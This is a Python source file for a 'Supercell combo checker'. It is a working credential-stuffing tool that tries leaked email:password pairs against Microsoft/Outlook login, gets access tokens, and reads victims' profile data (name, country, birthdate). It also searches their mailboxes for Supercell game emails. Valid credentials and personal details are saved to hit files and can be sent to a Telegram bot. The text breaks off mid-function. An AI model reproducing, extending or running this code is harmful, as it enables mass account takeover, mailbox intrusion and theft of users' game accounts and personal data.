import requests
import json
import uuid
import urllib.parse
import user_agent
import os
import datetime
import sys
import threading
import re
import queue
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init

# Initialize Colors
init(autoreset=True)

# Lock for clean output
print_lock = threading.Lock()

# --- SECURITY SYSTEM ---
EXPIRY_DATE = datetime.date(2086, 1, 20)
MY_SIGNATURE = "elyYazen"
TELEGRAM_CHANNEL = "https://t.me/YAZEN_TOOLS"

def check_time_safety():
    """Check if tool has expired"""
    try:
        res = requests.get('https://www.google.com', timeout=5)
        date_str = res.headers['Date']
        current_date = datetime.datetime.strptime(date_str, '%a, %d %b %Y %H:%M:%S %Z').date()
        
        if current_date > EXPIRY_DATE:
            with print_lock:
                print(f"{Fore.RED}❌ ERROR: THIS TOOL HAS EXPIRED!")
                print(f"{Fore.YELLOW}Contact the developer: {MY_SIGNATURE} - {TELEGRAM_CHANNEL}")
            sys.exit()
        return True
    except Exception:
        with print_lock:
            print(f"{Fore.RED}❌ SECURITY ERROR: Internet connection required for verification.")
        sys.exit()

check_time_safety()

def display_logo():
    """Display banner"""
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗
{Fore.CYAN}║                 SUPERCELL COMBO CHECKER                     ║
{Fore.CYAN}║                    Developed by {Fore.MAGENTA}{MY_SIGNATURE}                   ║
{Fore.CYAN}╚══════════════════════════════════════════════════════════════╝
{Fore.YELLOW}┌────────────────────────────────────────────────────────────┐
{Fore.YELLOW}│            Version: 2.0.0 | Expires: {EXPIRY_DATE}            │
{Fore.YELLOW}└────────────────────────────────────────────────────────────┘
{Fore.WHITE}──────────────────────────────────────────────────────────────
    """
    print(banner)

display_logo()

# Ensure directories exist
results_dir = "Supercell_Results"
if not os.path.exists(results_dir):
    os.makedirs(results_dir)

# Global Stats
class Stats:
    def __init__(self):
        self.total = 0
        self.checked = 0
        self.hits = 0
        self.bad = 0
        self.errors = 0
        self.supercell_hits = 0
        self.lock = threading.Lock()
    
    def increment_hit(self):
        with self.lock:
            self.hits += 1
            self.checked += 1
    
    def increment_supercell_hit(self):
        with self.lock:
            self.supercell_hits += 1
    
    def increment_bad(self):
        with self.lock:
            self.bad += 1
            self.checked += 1
    
    def increment_error(self):
        with self.lock:
            self.errors += 1
            self.checked += 1
    
    def get_stats(self):
        with self.lock:
            return {
                'total': self.total,
                'checked': self.checked,
                'hits': self.hits,
                'bad': self.bad,
                'errors': self.errors,
                'supercell_hits': self.supercell_hits
            }

stats = Stats()

class TelegramNotifier:
    def __init__(self, token, chat_id):
        self.token = token
        self.chat_id = chat_id
        self.enabled = bool(token and chat_id)
    
    def send(self, message):
        if not self.enabled:
            return
        
        try:
            url = f"https://api.telegram.org/bot{self.token}/sendMessage"
            payload = {
                'chat_id': self.chat_id,
                'text': message,
                'parse_mode': 'HTML'
            }
            requests.post(url, data=payload, timeout=5)
        except:
            pass

class HotmailAuthenticator:
    """Handles authentication flow EXACTLY like reference code"""
    
    @staticmethod
    def get_tokens(email):
        """Get initial authentication tokens - EXACTLY like reference Python code"""
        max_retries = 2
        for attempt in range(max_retries):
            try:
                headers = {
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": str(user_agent.generate_user_agent()),
                    "return-client-request-id": "false",
                    "client-request-id": str(uuid.uuid4()),
                    "x-ms-sso-ignore-sso": "1",
                    "correlation-id": str(uuid.uuid4()),
                    "x-client-ver": "1.1.0+9e54a0d1",
                    "x-client-os": "28",
                    "x-client-sku": "MSAL.xplat.android",
                    "x-client-src-sku": "MSAL.xplat.android",
                    "X-Requested-With": "com.microsoft.outlooklite",
                }
                
                params = {
                    "client_info": "1",
                    "haschrome": "1",
                    "login_hint": email,
                    "mkt": "en",
                    "response_type": "code",
                    "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                    "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
                    "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D"
                }
                
                url = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?{urllib.parse.urlencode(params)}"
                
                res = requests.get(url, headers=headers, timeout=10)
                cok = res.cookies.get_dict()
                
                # EXACT parsing from reference Python code
                try:
                    host = res.text.split('"urlPost":"')[1].split('",')[0]
                    ppft = res.text.split('name=\\"PPFT\\" id=\\"i0327\\" value=\\"')[1].split('\\"')[0]
                    ad_url = res.url.split('haschrome=1')[0] if 'haschrome=1' in res.url else res.url
                    
                    return {
                        'host': host,
                        'ppft': ppft,
                        'ad_url': ad_url,
                        'cookies': cok,
                        'response_text': res.text,
                        'response_url': res.url
                    }
                except IndexError:
                    continue
                    
            except Exception as e:
                if attempt == max_retries - 1:
                    return None
                time.sleep(0.5)
                continue
        
        return None
    
    @staticmethod
    def login(email, password, tokens):
        """Perform login - EXACTLY like reference Python code"""
        if not tokens:
            return {"status": "error", "message": "No tokens"}
        
        # Prepare cookies like reference code
        cok = tokens['cookies']
        cookie_parts = []
        
        if cok.get('MSPRequ'):
            cookie_parts.append(f"MSPRequ={cok['MSPRequ']}")
        if cok.get('uaid'):
            cookie_parts.append(f"uaid={cok['uaid']}")
        if cok.get('RefreshTokenSso'):
            cookie_parts.append(f"RefreshTokenSso={cok['RefreshTokenSso']}")
        if cok.get('MSPOK'):
            cookie_parts.append(f"MSPOK={cok['MSPOK']}")
        if cok.get('OParams'):
            cookie_parts.append(f"OParams={cok['OParams']}")
        
        cookie_str = "; ".join(cookie_parts)
        
        payload = {
            "i13": "1",
            "login": email,
            "loginfmt": email,
            "type": "11",
            "LoginOptions": "1",
            "lrt": "",
            "lrtPartition": "",
            "hisRegion": "",
            "hisScaleUnit": "",
            "passwd": password,
            "ps": "2",
            "psRNGCDefaultType": "",
            "psRNGCEntropy": "",
            "psRNGCSLK": "",
            "canary": "",
            "ctx": "",
            "hpgrequestid": "",
            "PPFT": tokens['ppft'],
            "PPSX": "PassportR",
            "NewUser": "1",
            "FoundMSAs": "",
            "fspost": "0",
            "i21": "0",
            "CookieDisclosure": "0",
            "IsFidoSupported": "0",
            "isSignupPost": "0",
            "isRecoveryAttemptPost": "0",
            "i19": "9960"
        }
        
        headers = {
            "Host": "login.live.com",
            "Connection": "keep-alive",
            "Content-Length": str(len(urllib.parse.urlencode(payload))),
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "Origin": "https://login.live.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": str(user_agent.generate_user_agent()),
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": f"{tokens['ad_url']}haschrome=1",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
            "Cookie": f"{cookie_str}; MicrosoftApplicationsTelemetryDeviceId={str(uuid.uuid4())}"
        }
        
        try:
            response = requests.post(tokens['host'], data=payload, headers=headers, 
                                    allow_redirects=False, timeout=10)
            login_cookies = response.cookies.get_dict()
            response_text = response.text
            location = response.headers.get('Location', '')
            
            # EXACT check from reference code
            if "JSH" in login_cookies and "JSHP" in login_cookies and "ANON" in login_cookies and "WLSSC" in login_cookies:
                # Extract code from location
                code = None
                if location and 'code=' in location:
                    code = location.split('code=')[1].split('&')[0]
                
                # Extract CID
                cid = login_cookies.get('MSPCID', cok.get('MSPCID', ''))
                
                return {
                    "status": "success",
                    "code": code,
                    "cid": cid.upper() if cid else "UNKNOWN",
                    "cookies": login_cookies,
                    "location": location,
                    "response": response
                }
            
            # Error checking from reference code
            html_lower = response_text.lower()
            
            if "account or password is incorrect" in html_lower:
                return {"status": "failure", "message": "Wrong password"}
            elif "too many times with" in html_lower:
                return {"status": "ban", "message": "Too many attempts"}
            elif "https://account.live.com/identity/confirm" in html_lower or "action=\"https://account.live.com/consent/update" in html_lower:
                return {"status": "failure", "message": "Identity confirmation required"}
            elif "https://account.live.com/recover" in html_lower:
                return {"status": "failure", "message": "Account recovery required"}
            elif "https://account.live.com/abuse" in html_lower or "https://login.live.com/finisherror.srf" in location.lower():
                return {"status": "failure", "message": "Abuse detection"}
            
            # Check for ServerData error
            if "ServerData =" in response_text:
                try:
                    start_idx = response_text.find("ServerData =")
                    if start_idx != -1:
                        start = response_text.find("{", start_idx)
                        brace_count = 1
                        end = start + 1
                        
                        while end < len(response_text) and brace_count > 0:
                            if response_text[end] == '{':
                                brace_count += 1
                            elif response_text[end] == '}':
                                brace_count -= 1
                            end += 1
                        
                        server_data_str = response_text[start:end]
                        server_data = json.loads(server_data_str)
                        
                        if server_data.get("fHasError", False):
                            return {
                                "status": "failure",
                                "error_code": server_data.get("sErrorCode"),
                                "error_text": server_data.get("sErrTxt")
                            }
                except:
                    pass
            
            return {"status": "failure", "message": "Login failed"}
            
        except Exception as e:
            return {"status": "error", "message": str(e)}
    
    @staticmethod
    def get_access_token(code):
        """Exchange authorization code for access token - FIXED"""
        if not code:
            return None
            
        try:
            token_data = {
                "client_info": "1",
                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                "grant_type": "authorization_code",
                "code": code,
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
            }
            
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)"
            }
            
            response = requests.post(
                "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                data=token_data,
                headers=headers,
                timeout=10
            )
            
            if response.status_code == 200:
                token_json = response.json()
                return token_json.get("access_token")
        except:
            pass
        
        return None

class SupercellScanner:
    """Supercell game scanner with EXACT data extraction from reference"""
    
    @staticmethod
    def extract_message_count_and_last_date(search_text):
        """Extract total message count and last message date from response text using regex"""
        total_messages = 0
        last_message_date = "Not Found"
        
        try:
            if not search_text:
                return total_messages, last_message_date
            
            # --- Extract Total Message Count ---
            message_count_patterns = [
                r'"Total"\s*:\s*(\d+)',
                r'"MessageCount"\s*:\s*(\d+)',
                r'"Messages"\s*:\s*(\d+)',
                r'"ItemCount"\s*:\s*(\d+)',
                r'"Count"\s*:\s*(\d+)',
                r'(\d+)\s+message',
                r'message[^\d]*(\d+)',
                r'"TotalCount"\s*:\s*(\d+)',
                r'"EntityCount"\s*:\s*(\d+)',
            ]
            
            all_message_counts = []
            for pattern in message_count_patterns:
                matches = re.findall(pattern, search_text, re.IGNORECASE)
                for match in matches:
                    try:
                        count = int(match)
                        if count > 0:
                            all_message_counts.append(count)
                    except:
                        continue
            
            if all_message_counts:
                total_messages = sum(all_message_counts)
            
            # --- Extract Last Message Date ---
            # Comprehensive date patterns for Supercell emails
            date_patterns = [
                # ISO 8601 with time: 2024-01-15T10:30:00Z or 2024-01-15T10:30:00.000Z
                r'\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(?:\.\d+)?Z?',
                # Date only: 2024-01-15
                r'\d{4}-\d{2}-\d{2}',
                # LastDeliveryTime pattern
                r'"LastDeliveryTime"\s*:\s*"([^"]+)"',
                # LastDeliveryOrRenewTime pattern
                r'"LastDeliveryOrRenewTime"\s*:\s*"([^"]+)"',
                # ReceivedTime pattern
                r'"ReceivedTime"\s*:\s*"([^"]+)"',
                # TimeStamp pattern
                r'"TimeStamp"\s*:\s*"([^"]+)"',
                # DateTime pattern
                r'"DateTime"\s*:\s*"([^"]+)"',
                # Supercell email date formats (DD/MM/YYYY or MM/DD/YYYY)
                r'\d{1,2}/\d{1,2}/\d{4}',
                r'\d{1,2}-\d{1,2}-\d{4}',
                # Outlook date formats
                r'\b(?:Mon|Tue|Wed|Thu|Fri|Sat|Sun),\s*\d{1,2}\s+(?:Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s+\d{4}',
            ]
            
            all_dates = []
            for pattern in date_patterns:
                matches = re.findall(pattern, search_text)
                for match in matches:
                    if match and match.lower() not in ['null', 'undefined', '']:
                        all_dates.append(match)
            
            # Convert dates to datetime objects and find the most recent
            datetime_objects = []
            for date_str in all_dates:
                try:
                    # Remove quotes if present
                    date_str = date_str.strip('"')
                    
                    # Try ISO format first (most common in email responses)
                    if 'T' in date_str:
                        # Remove milliseconds and timezone
                        date_part = date_str.split('T')[0]
                        # Try to parse date part
                        try:
                            dt = datetime.datetime.strptime(date_part, '%Y-%m-%d')
                            datetime_objects.append(dt)
                        except:
                            pass
                    
                    # Try YYYY-MM-DD format
                    elif re.match(r'\d{4}-\d{2}-\d{2}', date_str):
                        try:
                            dt = datetime.datetime.strptime(date_str, '%Y-%m-%d')
                            datetime_objects.append(dt)
                        except:
                            pass
                    
                    # Try DD/MM/YYYY format
                    elif re.match(r'\d{1,2}/\d{1,2}/\d{4}', date_str):
                        try:
                            dt = datetime.datetime.strptime(date_str, '%d/%m/%Y')
                            datetime_objects.append(dt)
                        except:
                            # Try MM/DD/YYYY format
                            try:
                                dt = datetime.datetime.strptime(date_str, '%m/%d/%Y')
                                datetime_objects.append(dt)
                            except:
                                pass
                    
                    # Try DD-MM-YYYY format
                    elif re.match(r'\d{1,2}-\d{1,2}-\d{4}', date_str):
                        try:
                            dt = datetime.datetime.strptime(date_str, '%d-%m-%Y')
                            datetime_objects.append(dt)
                        except:
                            # Try MM-DD-YYYY format
                            try:
                                dt = datetime.datetime.strptime(date_str, '%m-%d-%Y')
                                datetime_objects.append(dt)
                            except:
                                pass
                
                except Exception:
                    continue
            
            # Find the most recent date
            if datetime_objects:
                latest_date = max(datetime_objects)
                last_message_date = latest_date.strftime('%Y-%m-%d')
        
        except Exception as e:
            # Keep default values on error
            pass
        
        return total_messages, last_message_date
    
    @staticmethod
    def get_extended_profile_info(access_token, cid):
        """Get complete profile info EXACTLY like reference code"""
        try:
            headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Pragma": "no-cache",
                "Accept": "application/json",
                "ForceSync": "false",
                "Authorization": f"Bearer {access_token}",
                "X-AnchorMailbox": f"CID:{cid}",
                "Host": "substrate.office.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            
            # Try V1Profile endpoint first
            profile_url = "https://substrate.office.com/profileb2/v2.0/me/V1Profile"
            response = requests.get(profile_url, headers=headers, timeout=10)
            
            profile_data = {}
            response_text = ""
            
            if response.status_code == 200:
                response_text = response.text
                try:
                    profile_data = response.json()
                except:
                    # Try alternative endpoint if first fails
                    try:
                        profile_url2 = "https://substrate.office.com/users/v2.0/me"
                        response2 = requests.get(profile_url2, headers=headers, timeout=5)
                        if response2.status_code == 200:
                            response_text = response2.text
                            profile_data = response2.json()
                    except:
                        pass
            
            # Extract country EXACTLY like reference
            country = "Unknown"
            try:
                if 'location' in profile_data:
                    country = profile_data.get("location", "Unknown")
                elif 'country' in profile_data:
                    country = profile_data.get("country", "Unknown")
                
                # Check from accounts array
                if country == "Unknown" and 'accounts' in profile_data and isinstance(profile_data['accounts'], list) and len(profile_data['accounts']) > 0:
                    country = profile_data['accounts'][0].get('location', 'Unknown')
                
                # Check from mailboxSettings timezone
                if country == "Unknown" and 'mailboxSettings' in profile_data and 'timeZone' in profile_data['mailboxSettings']:
                    tz = profile_data['mailboxSettings']['timeZone']
                    tz_lower = tz.lower()
                    if 'cairo' in tz_lower or 'egypt' in tz_lower:
                        country = "Egypt"
                    elif 'riyadh' in tz_lower or 'saudi' in tz_lower:
                        country = "Saudi Arabia"
                    elif 'dubai' in tz_lower or 'uae' in tz_lower:
                        country = "UAE"
                    elif 'kuwait' in tz_lower:
                        country = "Kuwait"
                    elif 'qatar' in tz_lower:
                        country = "Qatar"
                    elif 'bahrain' in tz_lower:
                        country = "Bahrain"
                    elif 'oman' in tz_lower:
                        country = "Oman"
                    elif 'jordan' in tz_lower:
                        country = "Jordan"
                    elif 'lebanon' in tz_lower:
                        country = "Lebanon"
                    elif 'türkiye' in tz_lower or 'turkey' in tz_lower:
                        country = "Turkey"
                    elif 'germany' in tz_lower or 'berlin' in tz_lower:
                        country = "Germany"
                    elif 'france' in tz_lower or 'paris' in tz_lower:
                        country = "France"
                    elif 'spain' in tz_lower or 'madrid' in tz_lower:
                        country = "Spain"
                    elif 'italy' in tz_lower or 'rome' in tz_lower:
                        country = "Italy"
                    elif 'uk' in tz_lower or 'london' in tz_lower:
                        country = "United Kingdom"
                    elif 'usa' in tz_lower or 'new york' in tz_lower or 'los angeles' in tz_lower:
                        country = "USA"
                    elif 'brazil' in tz_lower or 'sao paulo' in tz_lower:
                        country = "Brazil"
                    elif 'mexico' in tz_lower:
                        country = "Mexico"
                    elif 'argentina' in tz_lower:
                        country = "Argentina"
                    elif 'colombia' in tz_lower:
                        country = "Colombia"
                    elif 'peru' in tz_lower:
                        country = "Peru"
                    elif 'chile' in tz_lower:
                        country = "Chile"
            except:
                country = "Unknown"
            
            # Extract name EXACTLY like reference
            name = "Unknown"
            try:
                if 'displayName' in profile_data:
                    name = profile_data.get("displayName", "Unknown")
                
                if name == "Unknown" and 'names' in profile_data and isinstance(profile_data['names'], list) and len(profile_data['names']) > 0:
                    name = profile_data['names'][0].get('displayName', 'Unknown')
                
                if name == "Unknown" and 'givenName' in profile_data and 'surname' in profile_data:
                    name = f"{profile_data['givenName']} {profile_data['surname']}"
                    
                if name == "Unknown" and 'userPrincipalName' in profile_data:
                    name = profile_data['userPrincipalName'].split('@')[0]
            except:
                name = "Unknown"
            
            # Extract birthdate EXACTLY like reference
            birth_day = ""
            birth_month = ""
            birth_year = ""
            
            try:
                # Direct fields
                if 'birthDay' in profile_data:
                    birth_day = str(profile_data['birthDay']).strip()
                if 'birthMonth' in profile_data:
                    birth_month = str(profile_data['birthMonth']).strip()
                if 'birthYear' in profile_data:
                    birth_year = str(profile_data['birthYear']).strip()
                
                # Parse from JSON string if not found
                if not birth_day or not birth_month or not birth_year:
                    json_str = json.dumps(profile_data) if profile_data else response_text
                    
                    if not birth_day:
                        bd_match = re.search(r'"birthDay"\s*:\s*"?(\d{1,2})"?', json_str)
                        if bd_match:
                            birth_day = bd_match.group(1)
                    
                    if not birth_month:
                        bm_match = re.search(r'"birthMonth"\s*:\s*"?(\d{1,2})"?', json_str)
                        if bm_match:
                            birth_month = bm_match.group(1)
                    
                    if not birth_year:
                        by_match = re.search(r'"birthYear"\s*:\s*"?(\d{4})"?', json_str)
                        if by_match:
                            birth_year = by_match.group(1)
                
                # Check birthDate object
                if (not birth_day or not birth_month or not birth_year) and 'birthDate' in profile_data:
                    bd = profile_data['birthDate']
                    if isinstance(bd, dict):
                        if not birth_day and 'birthDay' in bd:
                            birth_day = str(bd['birthDay']).strip()
                        if not birth_month and 'birthMonth' in bd:
                            birth_month = str(bd['birthMonth']).strip()
                        if not birth_year and 'birthYear' in bd:
                            birth_year = str(bd['birthYear']).strip()
            except:
                birth_day = birth_month = birth_year = ""
            
            # Format birthdate
            birthdate = "Unknown"
            if birth_day and birth_month and birth_year:
                if len(birth_day) == 1:
                    birth_day = f"0{birth_day}"
                if len(birth_month) == 1:
                    birth_month = f"0{birth_month}"
                birthdate = f"{birth_day}-{birth_month}-{birth_year}"
            elif birth_year and birth_month:
                birthdate = f"{birth_month}/{birth_year}"
            elif birth_year:
                birthdate = f"{birth_year}"
            
            # Extract last message date from profile using regex
            last_message = "Not Found"
            try:
                # Use regex to find date patterns in response text
                date_patterns = [
                    r'"LastDeliveryOrRenewTime"\s*:\s*"([^"]+)"',
                    r'"LastDeliveryTime"\s*:\s*"([^"]+)"',
                    r'\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}',
                    r'\d{4}-\d{2}-\d{2}',
                ]
                
                for pattern in date_patterns:
                    matches = re.findall(pattern, response_text)
                    if matches:
                        # Get the first match and extract date part
                        date_str = matches[0]
                        if 'T' in date_str:
                            last_message = date_str.split('T')[0]
                        else:
                            last_message = date_str
                        break
            except:
                pass
            
            return {
                "status": "success",
                "country": country,
                "name": name,
                "birthdate": birthdate,
                "last_message": last_message,
                "raw_data": profile_data
            }
            
        except Exception as e:
            return {"status": "error", "message": str(e)}
    
    @staticmethod
    def search_supercell_emails_and_get_total(access_token, cid, email):
        """Search for Supercell emails AND get total count - ALL IN ONE"""
        try:
            # First get startup data - EXACTLY like reference
            startup_url = f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0"
            startup_headers = {
                "Host": "outlook.live.com",
                "Content-Length": "0",
                "X-Owa-Sessionid": str(uuid.uuid4()),
                "X-Req-Source": "Mini",
                "Authorization": f"Bearer {access_token}",
                "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36",
                "Action": "StartupData",
                "X-Owa-Correlationid": str(uuid.uuid4()),
                "Ms-Cv": "YizxQK73vePSyVZZXVeNr+.3",
                "Content-Type": "application/json; charset=utf-8",
                "Accept": "*/*",
                "Origin": "https://outlook.live.com",
                "X-Requested-With": "com.microsoft.outlooklite",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://outlook.live.com/",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9"
            }
            
            startup_response = requests.post(startup_url, headers=startup_headers, data="", timeout=10)
            
            # Now search for supercell emails - EXACT SVB payload
            search_payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "Pacific Standard Time",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {
                        "Or": [
                            {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                            {"Term": {"DistinguishedFolderName": "DeletedItems"}}
                        ]
                    },
                    "From": 0,
                    "Query": {"QueryString": "noreply@id.supercell.com"},
                    "RefiningQueries": None,
                    "Size": 25,
                    "Sort": [
                        {"Field": "Score", "SortDirection": "Desc", "Count": 3},
                        {"Field": "Time", "SortDirection": "Desc"}
                    ],
                    "EnableTopResults": True,
                    "TopResultsCount": 3
                }],
                "QueryAlterationOptions": {
                    "EnableSuggestion": True,
                    "EnableAlteration": True,
                    "SupportedRecourseDisplayTypes": [
                        "Suggestion", "NoResultModification", "NoResultFolderRefinerModification",
                        "NoRequeryModification", "Modification"
                    ]
                },
                "LogicalId": str(uuid.uuid4())
            }
            
            search_headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Pragma": "no-cache",
                "Accept": "application/json",
                "ForceSync": "false",
                "Authorization": f"Bearer {access_token}",
                "X-AnchorMailbox": f"CID:{cid}",
                "Host": "substrate.office.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "Content-Type": "application/json"
            }
            
            response = requests.post(
                "https://outlook.live.com/searchservice/api/v2/query",
                json=search_payload,
                headers=search_headers,
                timeout=10
            )
            
            search_text = ""
            total_messages = 0
            last_message_date = "Not Found"
            
            if response.status_code == 200:
                search_text = response.text
                
                # Use regex to extract message info
                total_messages, last_message_date = SupercellScanner.extract_message_count_and_last_date(search_text)
                
            return {
                "search_text": search_text,
                "total_messages": total_messages,
                "last_message_date": last_message_date
            }
                
        except Exception as e:
            return {
                "search_text": "",
                "total_messages": 0,
                "last_message_date": "Not Found"
            }
    
    @staticmethod
    def analyze_supercell_emails(search_data):
        """Analyze Supercell emails for game information - EXACT SVB logic"""
        results = {
            "total_messages": search_data.get("total_messages", 0),
            "clash_royale": "❌",
            "brawl_stars": "❌",
            "clash_of_clans": "❌",
            "hay_day": "❌",
            "has_supercell": False
        }
        
        search_text = search_data.get("search_text", "")
        if not search_text:
            return results
        
        # Check for game mentions - EXACT SVB TRANSLATE LOGIC
        source_lower = search_text.lower()
        
        # Check Clash Royale
        if "clash royale" in source_lower:
            if "clash royale oyunu henüz bu supercell id hesabına bağlanmamış" in source_lower:
                results["clash_royale"] = "❌"
            else:
                results["clash_royale"] = "✔️"
                results["has_supercell"] = True
        
        # Check Brawl Stars
        if "brawl stars" in source_lower:
            if "brawl stars oyunu henüz bu" in source_lower:
                results["brawl_stars"] = "❌"
            else:
                results["brawl_stars"] = "✔️"
                results["has_supercell"] = True
        
        # Check Clash of Clans
        if "clash of clans" in source_lower:
            if "clash of clans oyunu henüz bu" in source_lower:
                results["clash_of_clans"] = "❌"
            else:
                results["clash_of_clans"] = "✔️"
                results["has_supercell"] = True
        
        # Check Hay Day
        if "hay day" in source_lower:
            if "hay day oyunu henüz bu" in source_lower:
                results["hay_day"] = "❌"
            else:
                results["hay_day"] = "✔️"
                results["has_supercell"] = True
        
        return results

class AccountProcessor:
    """Process individual accounts"""
    
    def __init__(self, telegram_notifier):
        self.telegram = telegram_notifier
    
    def process_account(self, email, password, account_num, total_accounts):
        """Process a single account with COMPLETE information extraction"""
        try:
            # Step 1: Get tokens
            tokens = HotmailAuthenticator.get_tokens(email)
            if not tokens:
                with print_lock:
                    print(f"{Fore.YELLOW}[!] {account_num}/{total_accounts} - Token error: {email}")
                    stats.increment_error()
                return None
            
            # Step 2: Login
            login_result = HotmailAuthenticator.login(email, password, tokens)
            
            if login_result["status"] == "success":
                # This is a VALID Microsoft account
                with print_lock:
                    print(f"{Fore.GREEN}[+] {account_num}/{total_accounts} - HIT : {email}")
                    stats.increment_hit()
                
                # Get access token
                code = login_result.get("code")
                access_token = None
                
                if code:
                    access_token = HotmailAuthenticator.get_access_token(code)
                
                cid = login_result.get("cid", "UNKNOWN")
                
                # Initialize with default values
                profile_info = {
                    "country": "Unknown",
                    "name": "Unknown",
                    "birthdate": "Unknown",
                    "last_message": "Not Found"
                }
                
                game_info = {
                    "total_messages": 0,
                    "clash_royale": "❌",
                    "brawl_stars": "❌",
                    "clash_of_clans": "❌",
                    "hay_day": "❌",
                    "has_supercell": False,
                    "last_message_date": "Not Found"
                }
                
                # Get detailed information if we have access token
                if access_token:
                    try:
                        # Get complete profile info
                        profile_data = SupercellScanner.get_extended_profile_info(access_token, cid)
                        if isinstance(profile_data, dict):
                            profile_info = profile_data
                        
                        # Search for Supercell emails and get ALL info
                        search_data = SupercellScanner.search_supercell_emails_and_get_total(access_token, cid, email)
                        
                        # Update game info with extracted data
                        game_info["total_messages"] = search_data.get("total_messages", 0)
                        game_info["last_message_date"] = search_data.get("last_message_date", "Not Found")
                        
                        # Get game analysis
                        game_analysis = SupercellScanner.analyze_supercell_emails(search_data)
                        game_info.update(game_analysis)
                        
                    except Exception as e:
                        with print_lock:
                            print(f"{Fore.YELLOW}[!] Info extraction error for {email}: {str(e)[:50]}")
                
                # Create final result with PRIORITY: search_data > profile_data
                # Use the last message date from Supercell email search
                final_last_message = game_info.get("last_message_date", "Not Found")
                
                result = {
                    "email": email,
                    "password": password,
                    "country": profile_info.get("country", "Unknown"),
                    "name": profile_info.get("name", "Unknown"),
                    "birthdate": profile_info.get("birthdate", "Unknown"),
                    "total_messages": game_info.get("total_messages", 0),
                    "clash_royale": game_info.get("clash_royale", "❌"),
                    "brawl_stars": game_info.get("brawl_stars", "❌"),
                    "clash_of_clans": game_info.get("clash_of_clans", "❌"),
                    "hay_day": game_info.get("hay_day", "❌"),
                    "last_message": final_last_message,
                    "has_supercell": game_info.get("has_supercell", False)
                }
                
                # Check if account has Supercell games
                if result["has_supercell"]:
                    # THIS IS A REAL SUPERCELL ACCOUNT
                    stats.increment_supercell_hit()
                    with print_lock:
                        print(f"{Fore.CYAN}[★] {account_num}/{total_accounts} - SUPERCELL HIT! : {email}")
                    
                    # Save to SUPERCELL hits file
                    self.save_supercell_result(result)
                    
                    # Send Telegram notification
                    self.send_telegram_notification(result, is_supercell=True)
                    
                else:
                    # Valid account WITHOUT Supercell
                    with print_lock:
                        print(f"{Fore.YELLOW}[✓] {account_num}/{total_accounts} - Valid account (no Supercell): {email}")
                    
                    # Save to general hits only
                    self.save_general_hit(result)
                
                return result
                
            elif login_result["status"] == "failure":
                # Bad account
                with print_lock:
                    print(f"{Fore.RED}[-] {account_num}/{total_accounts} - BAD : {email} ({login_result.get('message', 'Wrong password')})")
                    stats.increment_bad()
                return None
                
            elif login_result["status"] == "ban":
                # Ban
                with print_lock:
                    print(f"{Fore.MAGENTA}[BAN] {account_num}/{total_accounts} - {email}")
                    stats.increment_error()
                return None
                
            else:
                # Other error
                with print_lock:
                    print(f"{Fore.YELLOW}[!] {account_num}/{total_accounts} - ERROR: {email} ({login_result.get('message', 'Unknown error')})")
                    stats.increment_error()
                return None
                
        except Exception as e:
            with print_lock:
                print(f"{Fore.YELLOW}[!] {account_num}/{total_accounts} - Exception: {email} - {str(e)}")
                stats.increment_error()
            return None
    
    def save_supercell_result(self, result):
        """Save ONLY Supercell accounts to files"""
        output_line = (f"{result['email']}:{result['password']} | "
                      f"Country = {result['country']} | "
                      f"Name = {result['name']} | "
                      f"Birthdate = {result['birthdate']} | "
                      f"TOPLAM MESAJ = {result['total_messages']} | "
                      f"Clash Royale = {result['clash_royale']} | "
                      f"Brawl Stars = {result['brawl_stars']} | "
                      f"Clash of Clans = {result['clash_of_clans']} | "
                      f"Hay Day = {result['hay_day']} | "
                      f"SON MESAJ = {result['last_message']}")
        
        # Save to Supercell_Hits.txt (ONLY Supercell accounts)
        supercell_file = os.path.join(results_dir, "Supercell_Hits.txt")
        with open(supercell_file, "a", encoding="utf-8") as f:
            f.write(output_line + "\n")
        
        # Save to individual game files
        if result['clash_royale'] == "✔️":
            game_file = os.path.join(results_dir, "Clash_Royale.txt")
